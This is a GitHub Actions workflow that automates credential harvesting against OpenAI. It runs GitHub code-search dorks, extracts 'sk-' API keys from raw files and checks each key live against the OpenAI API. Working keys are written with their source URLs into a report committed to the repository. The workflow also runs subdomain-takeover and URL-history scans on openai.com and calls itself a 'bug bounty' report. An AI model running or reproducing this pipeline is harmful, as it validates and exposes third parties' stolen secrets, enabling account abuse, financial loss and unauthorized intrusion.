name: Ultimate-oombikal
on:
  workflow_dispatch:

permissions:
  contents: write

jobs:
  # 1. GITHUB DORKING: Finding the 6,100+ leaks
  github-dorks:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run GitHub Dorks
        env:
          GITHUB_TOKEN: ${{ secrets.GH_DORKER_TOKEN }}
        run: |
          mkdir -p dork_findings
          # Searching for OpenAI patterns
          curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/search/code?q=openai.com+password&per_page=100" >> dork_findings/leaks.json || true
          curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/search/code?q=openai.com+secret_key&per_page=100" >> dork_findings/leaks.json || true
      - name: Upload Dork Data
        uses: actions/upload-artifact@v4
        with:
          name: dork-results
          path: dork_findings/leaks.json

  # 2. AUTOMATED VERIFICATION: Testing the findings
  verify-leaks:
    needs: github-dorks
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Download Results
        uses: actions/download-artifact@v4
        with:
          name: dork-results
      - name: Verify OpenAI Keys
        run: |
          echo "=== VERIFIED LIVE KEYS ===" > verified_keys.txt
          # Convert GitHub URLs to Raw URLs and scan for sk- keys
          jq -r '.items[].html_url' leaks.json | sed 's/github.com/raw.githubusercontent.com/; s/\/blob\//\//' > targets.txt
          
          while read url; do
            # Find the key pattern sk- followed by alphanumeric characters
            key=$(curl -s "$url" | grep -oE "sk-[a-zA-Z0-9]{32,}" | head -n 1)
            if [ ! -z "$key" ]; then
              # Test the key against OpenAI API
              status=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $key" https://api.openai.com/v1/models)
              if [ "$status" == "200" ]; then
                echo "[CRITICAL] LIVE KEY FOUND: $key" >> verified_keys.txt
                echo "Source: $url" >> verified_keys.txt
                echo "---" >> verified_keys.txt
              fi
            fi
          done < targets.txt
      - name: Upload Verified
        uses: actions/upload-artifact@v4
        with:
          name: verified-data
          path: verified_keys.txt

  # 3. WAYBACK & TAKEOVERS (Independent Jobs)
  extra-scans:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Subjack & GAU
        run: |
          go install github.com/haccer/subjack@latest
          go install github.com/lc/gau/v2/cmd/gau@latest
          echo "openai.com" | ~/go/bin/gau > history.txt
          ~/go/bin/subjack -w recon/subs.txt -t 100 -ssl -o takeover.txt || true
      - name: Upload Extras
        uses: actions/upload-artifact@v4
        with:
          name: extra-data
          path: |
            history.txt
            takeover.txt

  # 4. FINAL REPORTING
  reporting:
    needs: [verify-leaks, extra-scans]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Download All
        uses: actions/download-artifact@v4
        continue-on-error: true
      - name: Build Final Report
        run: |
          echo "=== BUG BOUNTY SUMMARY REPORT ===" > final_full_report.txt
          echo "--- ACTIVE OPENAI KEYS ---" >> final_full_report.txt
          cat verified-data/verified_keys.txt >> final_full_report.txt || echo "None found yet." >> final_full_report.txt
          echo "--- SUBDOMAIN TAKEOVERS ---" >> final_full_report.txt
          cat extra-data/takeover.txt >> final_full_report.txt || echo "None." >> final_full_report.txt
      - name: Push to Repo
        run: |
          git config --local user.email "action@github.com"
          git config --local user.name "Security-Bot"
          git add final_full_report.txt
          git commit -m "Results Updated: Found $(grep -c 'LIVE KEY' final_full_report.txt || echo 0) live keys" || exit 0
          git push
          
